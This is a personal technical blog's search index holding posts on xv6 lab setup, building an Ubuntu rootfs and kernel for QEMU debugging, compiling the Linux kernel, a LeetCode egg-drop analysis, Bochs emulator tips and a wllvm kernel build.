<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>6.S081 2020 Lab 1 - Xv6 Set Up &amp; Unix utilities</title>
    <url>/2022/01/09/6-S081-2020-Lab-1-Set-Up/</url>
    <content><![CDATA[<p>本文介绍了如何完成 MIT OS 课程 6.S081 相关实验环境的搭建和类 Unix 系统功能的熟悉过程。</p>
<a id="more"></a>



<h1 id="xv6-环境搭建（MacOS-12-1）"><a href="#xv6-环境搭建（MacOS-12-1）" class="headerlink" title="xv6 环境搭建（MacOS 12.1）"></a>xv6 环境搭建（MacOS 12.1）</h1><h2 id="依赖软件"><a href="#依赖软件" class="headerlink" title="依赖软件"></a>依赖软件</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5kZXZlbG9wZXIuYXBwbGUuY29tL0RldmVsb3Blcl9Ub29scy9Db21tYW5kX0xpbmVfVG9vbHNfZm9yX1hjb2RlXzEzLjIvQ29tbWFuZF9MaW5lX1Rvb2xzX2Zvcl9YY29kZV8xMy4yLmRtZw==" title="https://download.developer.apple.com/Developer_Tools/Command_Line_Tools_for_Xcode_13.2/Command_Line_Tools_for_Xcode_13.2.dmg">Command Line Tools for Xcode 13.2<i class="fa fa-external-link"></i></span></li>
<li>riscv-tools (using <code>brew</code> to install)<ul>
<li>riscv64-unknown-elf-gcc (GCC) 11.1.0</li>
</ul>
</li>
<li>qemu (using <code>brew</code> to install)<ul>
<li>QEMU emulator version 6.2.0</li>
</ul>
</li>
</ul>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi5TMDgxLzIwMjAvdG9vbHMuaHRtbA==" title="https://pdos.csail.mit.edu/6.S081/2020/tools.html">Tools Used in 6.S08<i class="fa fa-external-link"></i></span> - xv6 编译、运行的相关依赖软件安装（MacOS、Ubuntu、Windows）</li>
</ul>
<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>2020版本的xv6对qemu新版本的支持有些问题，造成在运行以下命令时卡住不动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0</span><br></pre></td></tr></table></figure>

<p>通过相关文档搜索，发现这个问题已经在一个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pdC1wZG9zL3h2Ni1yaXNjdi9wdWxsLzYy" title="https://github.com/mit-pdos/xv6-riscv/pull/62">pull request<i class="fa fa-external-link"></i></span>中解决。可以通过以下命令来将代码改动merge到当前的branch中(在 xv6 repo 根目录操作)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote add official https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">$ git fetch official pull/62/head</span><br><span class="line">$ git merge FETCH_HEAD</span><br></pre></td></tr></table></figure>

<p>上述命令执行之后，可以在当前的branch中通过<code>make qemu</code>正常启动xv6的kernel和对应的SHELL。</p>
<h1 id="Lab-1-Xv6-and-Unix-utilities"><a href="#Lab-1-Xv6-and-Unix-utilities" class="headerlink" title="Lab 1: Xv6 and Unix utilities"></a>Lab 1: Xv6 and Unix utilities</h1><p>lab1需要完成以下几个小程序</p>
<ul>
<li>sleep</li>
<li>pingpong</li>
<li>primes</li>
<li>find</li>
<li>xargs</li>
</ul>
<p>以上几个程序的具体要求和提示参见参考文档中的实验说明。</p>
<p>比较有挑战性的就是primes，根据实验说明里面给出的算法，需要设计多个进程并行进行检查，调用fork和pipe进行进程的创建和通信。</p>
<h2 id="参考文档-1"><a href="#参考文档-1" class="headerlink" title="参考文档"></a>参考文档</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi5TMDgxLzIwMjAvbGFicy91dGlsLmh0bWw=" title="https://pdos.csail.mit.edu/6.S081/2020/labs/util.html">Lab: Xv6 and Unix utilities<i class="fa fa-external-link"></i></span> - 实验说明</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW55dXpob3U5NS82LlMwODEvY29tbWl0LzI3ZGFiZGEwNzkyMTg3OWY4MmI4YTMyYzk3YTVhM2UyNTViNGY1NjI/ZGlmZj11bmlmaWVk" title="https://github.com/tianyuzhou95/6.S081/commit/27dabda07921879f82b8a32c97a5a3e255b4f562?diff=unified">GitHub Commit<i class="fa fa-external-link"></i></span> - 我的Lab1代码</li>
</ul>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>qemu</tag>
        <tag>xv6</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu filesystem image create(for qemu)</title>
    <url>/2021/03/31/ubuntu-filesystem-image-create-for-qemu/</url>
    <content><![CDATA[<p>This blog introduces a method to create rootfs.img of ubuntu for qemu dbg.</p>
<p>Thanks to Jiadong and Jinyan!</p>
<a id="more"></a>
<h2 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h2><p>Download a copy of Ubuntu OS into a newly created directory. (<span class="exturl" data-url="aHR0cDovL2NkaW1hZ2UudWJ1bnR1LmNvbS9yZWxlYXNlcy8=" title="http://cdimage.ubuntu.com/releases/">image site<i class="fa fa-external-link"></i></span>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir ubuntu_18.04 &amp;&amp; <span class="built_in">cd</span> ubuntu_18.04</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget http://cdimage.ubuntu.com/releases/18.04.5/release/ubuntu-18.04.5-server-amd64.iso</span></span><br></pre></td></tr></table></figure>

<p>Create a new sub-directory where the iso image will be mounted.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir tmp</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mount -o loop ubuntu-18.04.5-server-amd64.iso tmp/</span></span><br></pre></td></tr></table></figure>

<p>The Ubuntu file system ( <em>filesystem.squashfs</em> ) is located in the <code>/install</code> sub-directory.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls tmp/install/ | ag filesystem</span></span><br><span class="line">filesystem.manifest</span><br><span class="line">filesystem.size</span><br><span class="line">filesystem.squashfs</span><br><span class="line">filesystem.squashfs.gpg</span><br></pre></td></tr></table></figure>

<p>Unsquash that file system into a directory named <code>rootfs</code>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo unsquashfs -d rootfs/ tmp/install/filesystem.squashfs</span></span><br></pre></td></tr></table></figure>

<p>This directory now contains the Ubuntu file system.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls rootfs</span></span><br><span class="line">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure>

<p>Remove the password for root login by opening <code>rootfs/etc/passwd</code> file and removing the <code>x</code> between <code>root:</code> and <code>:0</code> so that the line looks like this</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim rootfs/etc/passwd</span></span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>Create <code>rootfs.img</code>.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> install package <span class="keyword">if</span> you don<span class="string">'t have</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install libguestfs-tools</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo virt-make-fs --<span class="built_in">type</span>=ext4 --size=1G rootfs rootfs.img</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> maybe you will need chmod to make rootfs.img accessable <span class="keyword">for</span> normal user</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 666 rootfs.img</span></span><br></pre></td></tr></table></figure>

<p>Now you get <code>rootfs.img</code> to used in qemu.</p>
<h2 id="Kernel-Compile-and-QEMU-Run"><a href="#Kernel-Compile-and-QEMU-Run" class="headerlink" title="Kernel Compile and QEMU Run"></a>Kernel Compile and QEMU Run</h2><p>Use <code>x86_64_defconfig</code> and <code>localmodconfig</code> to compile kernel</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> linux/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make x86_64_defconfig</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make localmodconfig</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> select DEBUG_INFO and GDB_SCRIPTS</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make menuconfig</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make -j$(nproc)</span></span><br></pre></td></tr></table></figure>

<p>Run qemu</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">ROOTFS_EXT4="/path/to/ubuntu/ubuntu_18.04/rootfs.img"</span><br><span class="line">KERNEL_BZ_IMAGE="/path/to/linux/linux-5.10/arch/x86/boot/bzImage"</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-s \</span><br><span class="line">-kernel $KERNEL_BZ_IMAGE \</span><br><span class="line">-hda $ROOTFS_EXT4 \</span><br><span class="line">-append "nokaslr console=ttyS0 root=/dev/sda rw" \</span><br><span class="line">-nographic \</span><br><span class="line">-netdev user,id=net0 \</span><br><span class="line">-device e1000,netdev=net0</span><br></pre></td></tr></table></figure>



<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><span class="exturl" data-url="aHR0cDovL3dpa2kuZXNwcmVzc29iaW4ubmV0L3Rpa2ktaW5kZXgucGhwP3BhZ2U9Q3JlYXRpbmcrVWJ1bnR1K2ZpbGVzeXN0ZW0=" title="http://wiki.espressobin.net/tiki-index.php?page=Creating+Ubuntu+filesystem">Creating Ubuntu filesystem<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3pqdS5waHZudG9tLnRlY2gvbWFya2Rvd24vbWQyaHRtbC5waHA/aWQ9bWQvMjAyMC0xMi9taW5kaXMubWQ=" title="http://zju.phvntom.tech/markdown/md2html.php?id=md/2020-12/mindis.md">Build a minimal distribution<i class="fa fa-external-link"></i></span> <em>need ZJU VPN access</em></li>
</ol>
]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>qemu</tag>
        <tag>ubuntu</tag>
        <tag>kernel</tag>
        <tag>rootfs</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu compile and install kernel</title>
    <url>/2021/03/29/ubuntu-compile-and-install-kernel/</url>
    <content><![CDATA[<p>在 ubuntu 上编译 Linux kernel 并安装内核。避免安装多余的模块。</p>
<a id="more"></a>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /path/to/linux</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make localmodconfig</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make -j$(nproc)</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make modules_install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install <span class="comment"># this will automatically update initrd and grub</span></span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>[leetcode]drop eggs</title>
    <url>/2021/01/28/leetcode-drop-eggs/</url>
    <content><![CDATA[<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
inlineMath: [['$','$']]
}
});
</script>

<p>经典的鸡蛋掉落问题解析。包含了3个解答。</p>
<a id="more"></a>

<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>你将获得 <code>K</code> 个鸡蛋，并可以使用一栋从 <code>1</code> 到 <code>N</code>  共有 <code>N</code> 层楼的建筑。</p>
<p>每个蛋的功能都是一样的，如果一个蛋碎了，你就不能再把它扔下去。</p>
<p>你知道存在楼层 <code>F</code> ，满足 <code>0 &lt;= F &lt;= N</code> 任何从高于 <code>F</code> 的楼层落下的鸡蛋都会碎，从 <code>F</code> 楼层或比它低的楼层落下的鸡蛋都不会破。</p>
<p>每次移动，你可以取一个鸡蛋（如果你有完整的鸡蛋）并把它从任一楼层 <code>X</code> 扔下（满足 <code>1 &lt;= X &lt;= N</code>）。</p>
<p>你的目标是知道 <code>F</code> 的值是多少。</p>
<p>无论 <code>F</code> 的初始值如何，你确定 <code>F</code> 的值的最小移动次数是多少？</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：K &#x3D; 1, N &#x3D; 2</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">鸡蛋从 1 楼掉落。如果它碎了，我们肯定知道 F &#x3D; 0 。</span><br><span class="line">否则，鸡蛋从 2 楼掉落。如果它碎了，我们肯定知道 F &#x3D; 1 。</span><br><span class="line">如果它没碎，那么我们肯定知道 F &#x3D; 2 。</span><br><span class="line">因此，在最坏的情况下我们需要移动 2 次以确定 F 是多少。</span><br></pre></td></tr></table></figure>

<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2"></a>示例 2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：K &#x3D; 2, N &#x3D; 6</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>

<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例 3"></a>示例 3</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：K &#x3D; 3, N &#x3D; 14</span><br><span class="line">输出：4</span><br></pre></td></tr></table></figure>



<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>我碰到这道题的时候，第一反应是非常的熟悉。惭愧的是，在本科找实习的时候面试网易，没有成功的做出来这道题。虽然当时的思路已经记不清了，但是我还是本能的想到可能涉及到了动态规划。动态规划在我看来其实和数学归纳很相似，存在了一个递推公式。</p>
<p><strong>鸡蛋掉落问题</strong>其实也存在类似的规律。如果不计较计算成本，我们可以采用非常暴力的枚举法来解决这个问题。</p>
<p>如当我们求解 $(K, N)$ 条件下的 $F$ 时，可以先分析第一次扔鸡蛋的情况。</p>
<p>假设我们在第 $x$ 层（$1 \leq x \leq K$）扔下了鸡蛋，可能会存在以下两种情况：</p>
<ol>
<li>蛋碎了（T_T），那么我们得到了一个结论—— $F &lt; x$</li>
<li>蛋没碎（^_^），因此同样可以得到一个结论—— $F \geq x$</li>
</ol>
<p><em>注意情况（2）中，真正的 $F$ 可能恰好就是 $x$。</em></p>
<p>不管蛋有没有碎，我们都需要继续进一步去确认 $F$ 的值，因此需要继续投蛋。这个时候就可以发现，不管是情况（1）还是情况（2），都跟原来的问题具有很大的相似性：</p>
<ol>
<li>蛋碎了（$F &lt; x$），即已知 $0 \leq F \leq x-1$，$K&#39; = K-1$，求得到 $F$ 的最小次数，换句话来说，就是 $K&#39; = K-1, N&#39; = x-1$ 情况下的求解</li>
<li>蛋没碎（$F \geq x$），稍微有点绕，已知 $x \leq F \leq N$，$K&#39; = K$，求得到 $F$ 的最小次数，就是 $K&#39; = K, N&#39; = N - x$ 情况下的求解</li>
</ol>
<p>我们记原问题的解为 $L(K, N)$，则情况（1）为继续求解 $L(K-1, x-1)$， 情况（2）为继续求解 $L(K, N-x)$。因此我们可以将原问题分解为两个子问题<br>$$<br>L(K, N) = 1 + \min_{1\leq x\leq N}(\max(L(K-1, x-1), L(K, N-x)))\tag{1}<br>$$</p>
<p>到了这一步不难看出，只要 $K&gt;1$ 或 $N &gt; 1$，我们就可以不断的去分解问题，当 $K = 1$ 的时候，因为承受不起蛋碎的后果，所以只能从最低层一层一层往上扔蛋了。</p>
<p>如果不考虑时间复杂度的话，题目到这里就已经解好了，即我们每次只需要从 $1$ 到 $N$ 遍历求一遍所有的 $\max(L(K-1, x-1), L(K, N-x))$，这之中最小的那个就是我们要的次数。</p>
<p><strong>然而这个大部分人都想的到，所以会因为 time limit 被卡在一些测试点上。</strong></p>
<h2 id="解法展示"><a href="#解法展示" class="headerlink" title="解法展示"></a>解法展示</h2><h3 id="解1-二分查找"><a href="#解1-二分查找" class="headerlink" title="解1 二分查找"></a>解1 二分查找</h3><p>为了减少时间复杂度，我们需要优化寻找最优解的过程，回到刚刚总结出的递推公式 $(1)$<br>$$<br>L(K, N) = 1 + \min_{1\leq x\leq N}(\max(L(K-1, x-1), L(K, N-x)))\tag{1}<br>$$</p>
<p>在求解使得 $\max(L(K-1, x-1), L(K, N-x))$ 最小的 $x_{opt}$ 时，最粗暴也是时间复杂度最大的方法是从 1 到 N 遍历，找到其中的最小值。如果采用这种方法，那么时间复杂度就会变成 $O(KN^2)$。</p>
<p>一开始我也想到了使用二分查找来解决这个问题，但是我思考的不对，我直接拿 $N/2$ 来进行查找，默认 $x_{opt}$ 就是 $N/2$。后来我才意识到这是不对的，在很多情况下（如 $L(2, 100)$），$x_{opt}$ 明显不等于 50。</p>
<p>后来我从别人的解答中发现，我其实没有掌握二分法的精髓。二分法的精髓在于，<strong>要找到最优解的左右两边的不等关系</strong>。</p>
<p>如下图所示，我们要求解曲线 $y=f(x)$ 和 $x$ 轴的交点 $(x_0, 0)$，使得当 $x=x_0$ 时，$y_0=f(x_0)=0$。此时我们需要注意到，在 $x_0$ 的左侧（$x_l &lt; x &lt; x_0$），有 $f(x) &lt; 0$；同理在 $x_0$ 的右侧（$x_r &gt; x&gt;x_0$），有 $f(x) &gt; 0$。因此我们可以找到一组 $(x_l, x_r)$，有 $f(x_l) &lt; 0, f(x_r) &gt; 0, x_l &lt; x_0 &lt; x_r$，这个时候我们取 $x_{mid} = (x_l + x_r)/2$，计算 $f(x_{mid})$ 的值，并更新 $(x_l, x_r)$。</p>
<p><img src="/images/leetcoode/drop-eggs/1.png" alt="image-20210130101022092"></p>
<p>由此看出，二分法的实质其实是在于解的两侧存在着不等式的改变，当且仅当 $x = x_0$ 时，等式成立。</p>
<p>那么我们也可以将扔鸡蛋的问题改造成二分查找问题。首先分析公式（1）的内部<br>$$<br>\max(L(K-1, x-1), L(K, N-x)) \tag{2}<br>$$<br>当 $K$，$N$ 不变时，可将上式（2）变为<br>$$<br>\max(f(x), g(x)) \tag{2&#39;}<br>$$<br>其中 $f(x) = L(K-1, x-1)$，$g(x) = L(K, N-x)$。</p>
<p>无论是 $f(x)$ 还是 $g(x)$，单调性都可以非常明显的看出。对于 $f(x)=L(K-1, x-1)$，显然 $x$ 越大，$f(x)$ 越大；对于 $g(x)$ 来说，明显 $x$ 越大，$g(x)$ 越小。且有 $f(1) \leq g(1), f(N) &gt; g(N)$，因此可以绘制如下曲线</p>
<p><img src="/images/leetcoode/drop-eggs/2.png" alt="image-20210129202306777"></p>
<p>其中 $f(x)$ 和 $g(x)$ 的交点为 $A(x_A, y_A)$，可以看出在 $A$ 点左侧，$f(x) &lt; g(x)$，在 $A$ 点右侧，$f(x) &gt; g(x)$。因此有<br>$$<br>\max(f(x), g(x)) =\begin{cases}<br>&amp; g(x) &amp; (x&lt;x_A) \\<br>&amp; y_A &amp; (x = x_A) \\<br>&amp; f(x) &amp; (x&gt;x_A)<br>\end{cases}<br>\tag{2&#39;&#39;}<br>$$<br>明显当 $x=x_A$ 时，上述式子取到最小值。而由公式（2‘’）可以找到二分法的不等关系，即在最优解 $x_A$ 的左侧，有 $f(x) &lt; g(x)$， 在最优解 $x_A$ 右侧，$f(x) &gt; g(x)$。因此可以应用二分法来锁定最逼近最优解 $x_A$ 的值 $x_{opt}$（由于必须要取整数，所以无法直接取到 $x_A$）。</p>
<p>道理讲清楚代码就好写了。</p>
<p>这里的时间复杂度是 $O(K*NlogN)$。</p>
<h3 id="解2-决策单调性"><a href="#解2-决策单调性" class="headerlink" title="解2 决策单调性"></a>解2 决策单调性</h3><p>如果不用二分法，也可以从函数的单调性入手。</p>
<p>重新来审视之前总结的公式（1）<br>$$<br>L(K, N) = 1 + \min_{1\leq x\leq N}(\max(L(K-1, x-1), L(K, N-x)))\tag{1}<br>$$</p>
<p>我们可以注意到，当如果 $K, x$ 保持不变，当 $N$ 变大时， $f(x) = L(K-1, x-1)$ 保持不变，$g(x) = L(K, N-x)$ 显然会变大。可以解读为 $f(x)$ 曲线不变，$g(x)$ 曲线右移</p>
<p><img src="/images/leetcoode/drop-eggs/3.png" alt="image-20210129202234888"></p>
<p>因此最优解 $x_{A&#39;}$ 肯定也会右移。由此对于最优解 $x_{opt}$ 来说，当 $K$ 保持不变时，$x_{opt}$ 会随着 $N$ 的增大而增大。因而我们可以发现，如果从 $K=1$ 开始计算，遍历一遍 $N$ 就能得到所有 $N = n$ 情况下的最优解 $x_{opt}$ 和最小值 $L(K, n)$。</p>
<p>从而代码也就好写了。</p>
<p>这里的时间复杂度时 $O(K*N)$ </p>
<h3 id="解3-逆向思维"><a href="#解3-逆向思维" class="headerlink" title="解3 逆向思维"></a>解3 逆向思维</h3><p>这种方法按照一般思维顺序是想不到的。这里我们先把之前整理出来的公式忘掉，并思考以下问题：</p>
<p><strong>给定投掷次数 $T$，和鸡蛋的个数 $K$，最多能够确定多少层楼的确切掉落高度？</strong></p>
<p>如果我们能够确定每一组 $(T, K)$ 对应的最大楼层高度 $N$，那么对于任意 $N$，只要找到对应的最小 $T$ 即可。</p>
<p>我们设<br>$$<br>N = f(T, K)<br>$$<br>有如下特殊情况<br>$$<br>f(T, 1) = T \\<br>f(1, K) = 1<br>$$<br>在此基础上我们设想投掷一次鸡蛋的情况，无非还是之前讨论过的两种情况：</p>
<ol>
<li>鸡蛋碎了，可用次数 $T = T - 1$，可用鸡蛋 $K = K-1$</li>
<li>鸡蛋没碎，可用次数 $T=T-1$，可用鸡蛋 $K = K$</li>
</ol>
<p>因此对于情况 1，还可以测 $f(T-1, K-1)$ 层楼，对于情况 2，还可以测 $f(T-1, K)$ 层楼，加上这一次投掷测出来的这一层，之前的公式可以展开为<br>$$<br>f(T, K) = 1 + f(T-1, K-1) + f(T-1, K)<br>$$<br>如下图所示，其实我们不必去思考第一层还是最后一层，我们只关心给定 $T$ 和 $K$，最多可以测量多少层楼。因此需要把两种情况都加起来，这里和之前的两种解法都不一样，需要仔细的去想清楚。</p>
<p><img src="/images/leetcoode/drop-eggs/4.png" alt="image-20210131132122708"></p>
<p>有了这层递归关系之后，就可以从 $f(1, 1)$ 开始迭代了。</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>binary search</tag>
        <tag>dynamic programming</tag>
      </tags>
  </entry>
  <entry>
    <title>Some Tip for Bochs(the famous x86 emulator)</title>
    <url>/2021/01/24/bochs-info/</url>
    <content><![CDATA[<p>本文简要介绍了如何使用 Bochs，包括跑一个 Linux OS（当然 windows 肯定也是可以的），以及如何利用编写 Bochs 脚本来获取 Guest OS 的运行数据。</p>
<a id="more"></a>


<p>以下是关于 Bochs 的官方说明。（本文所有引用均来源于 Bochs 的官方网站）</p>
<blockquote>
<p>Bochs is a highly portable <strong>open source IA-32 (x86) PC emulator written in C++</strong>, that runs on most popular platforms. It includes emulation of the Intel x86 CPU, common I/O devices, and a custom BIOS. Bochs can be compiled to emulate many different x86 CPUs, from early 386 to the most recent x86-64 Intel and AMD processors which may even not reached the market yet.</p>
</blockquote>
<p>Bochs 解释了所有的 x86 机器指令，当然是 hardware specific 的，同时也支持所有的外设（有相应的设备模式）。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZXByb2plY3R6ZXJvL2JvY2hzcHduXShodHRwczovL2dpdGh1Yi5jb20vZ29vZ2xlcHJvamVjdHplcm8vYm9jaHNwd24=" title="https://github.com/googleprojectzero/bochspwn](https://github.com/googleprojectzero/bochspwn">bochspwn<i class="fa fa-external-link"></i></span>就是利用 Bochs 来分析 OS runtime 信息的一种应用。</p>
<blockquote>
<p>Perhaps your objective is to debug software or hardware drivers. Bochs offers a <strong>controlled environment</strong> that can better assist you in determining cause and effect relationships. You can take <strong>snapshots</strong> that show you what is going on behind the scenes. You can <strong>isolate</strong> the line that caused that crash. You can have multiple images and compare them under a microscope. In these situation, Bochs could save you time and resources.</p>
</blockquote>
<p>这一点正是我们想要的，和 docker 这种依赖于 Host kernel 的虚拟化不同，Bochs 还原了所有的机器指令，并且不像 VMWare 或 Virtual Box 这些主流的虚拟机做了优化，因此便于调试和探索。</p>
<blockquote>
<p>Bochs will run on Windows, GNU/Linux, FreeBSD, OpenBSD, or MacOSX. If you are running on x86 hardware, you have a range of choices. Check the installation section for your host platform to see what options Bochs supports on your platform. If the most important factor is speed, you may want to try a virtualization product instead of Bochs (VMware, VirtualBox, QEMU).</p>
</blockquote>
<p>之前本来想用 qemu 来做这个，但现在看来似乎 QEMU 也做了一些优化，如果 Bochs 的插件实现难度过大再转 QEMU 吧。</p>
<h1 id="Bochs-基本用法"><a href="#Bochs-基本用法" class="headerlink" title="Bochs 基本用法"></a>Bochs 基本用法</h1><ul>
<li><span class="exturl" data-url="aHR0cDovL3NvdXJjZWZvcmdlLm5ldC9wcm9qZWN0cy9ib2Nocy9maWxlcy9ib2Nocw==" title="http://sourceforge.net/projects/bochs/files/bochs">All Release Site<i class="fa fa-external-link"></i></span></li>
</ul>
<p>因为要编译的缘故，所以这里下载的是 <code>.tar.gz</code> 结尾的压缩包。解压之后，需要参考 Bochs 官方网站的编译指令来进行编译。</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2JvY2hzLnNvdXJjZWZvcmdlLm5ldC9kb2MvZG9jYm9vay91c2VyL2NvbXBpbGluZy5odG1s" title="http://bochs.sourceforge.net/doc/docbook/user/compiling.html">编译指令详解<i class="fa fa-external-link"></i></span></li>
</ul>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>可以通过 <code>config</code>,  <code>make</code>, <code>make install</code> 来进行编译安装。具体指令参考 <span class="exturl" data-url="aHR0cDovL2JvY2hzLnNvdXJjZWZvcmdlLm5ldC9jZ2ktYmluL3RvcHBlci5wbD9uYW1lPU5ldytCb2NocytEb2N1bWVudGF0aW9uJnVybD1odHRwOi8vYm9jaHMuc291cmNlZm9yZ2UubmV0L2RvYy9kb2Nib29rL3VzZXIvaW5kZXguaHRtbA==" title="http://bochs.sourceforge.net/cgi-bin/topper.pl?name=New+Bochs+Documentation&url=http://bochs.sourceforge.net/doc/docbook/user/index.html">Bochs 官方网站关于编译的说明<i class="fa fa-external-link"></i></span></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><span class="exturl" data-url="aHR0cDovL2JvY2hzLnNvdXJjZWZvcmdlLm5ldC8=" title="http://bochs.sourceforge.net/">http://bochs.sourceforge.net/<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Bochs</tag>
        <tag>Linux Kernel</tag>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title>wllvm-linux-kernel-no-optimize</title>
    <url>/2020/03/31/wllvm-linux-kernel-no-optimize/</url>
    <content><![CDATA[<p>试验性的将 Linux kernel 5.4 用 wllvm 编成 vmlinux，且优化参数为 <code>O0</code>。</p>
<p>参考了网上的几篇教程，有<span class="exturl" data-url="aHR0cHM6Ly9hcmtpdm0uZ2l0aHViLmlvLzIwMTYvMTIvMjYvbGludXgtd2hvbGUtcHJvZ3JhbS1iYy8=" title="https://arkivm.github.io/2016/12/26/linux-whole-program-bc/">较低版本的 kernel<i class="fa fa-external-link"></i></span>，以及<span class="exturl" data-url="aHR0cDovL3d3dy5jcy51dGFoLmVkdS9+YWJ1cnRzZXYvbGNkLWRvYy9pbmRleC5waHA/bj1EZWtlci5Ib21l" title="http://www.cs.utah.edu/~aburtsev/lcd-doc/index.php?n=Deker.Home">简单的教程<i class="fa fa-external-link"></i></span>。</p>
<p>还有<span class="exturl" data-url="aHR0cDovL2Jsb2cueGlleHVuLnRlY2gvbGludXgtYmMtY3VzdG9tLW9wdC5odG1s" title="http://blog.xiexun.tech/linux-bc-custom-opt.html">学弟的 blog<i class="fa fa-external-link"></i></span>，亲测可用。</p>
<p>本文参照了手动修改 makefile 的方法。</p>
<a id="more"></a>

<p>这是根目录上 MakeFile 的修改方法。</p>
